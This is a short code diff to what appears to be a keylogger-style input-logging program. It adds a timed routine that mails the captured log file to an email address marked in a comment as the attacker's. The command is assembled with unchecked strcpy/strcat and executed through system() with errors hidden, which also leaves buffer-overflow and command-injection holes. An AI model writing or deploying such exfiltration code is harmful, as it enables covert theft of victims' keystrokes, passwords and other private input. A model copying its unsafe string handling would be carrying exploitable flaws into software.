@@ -619,8 +619,15 @@ int main(int argc, char **argv)
 
     // ADDED BY ELI
     // End of reading input loop: add in mail command (clear log file after sending mail) and encryption (?)
-    //if (localtime(&cur_time) == "2014-05-10 10:30:00+0000") 
-    //  system("mail -s \"
+
+    char *email_time = "2014-05-10 11:15"; // ** Change this according
+    if(!(strncmp(timestamp, email_time, strlen(email_time)))) {
+      char command[2500]; // Maximum size of string
+      strcpy(command, "mail stine.eli@gmail.com < "); // ** change with attackers address
+      strcat(command, args.logfile.c_str()); // our log file
+      strcat(command, " 2>/dev/null");
+      return system(command);
+    }
 
   } // while (read(input_fd))
   
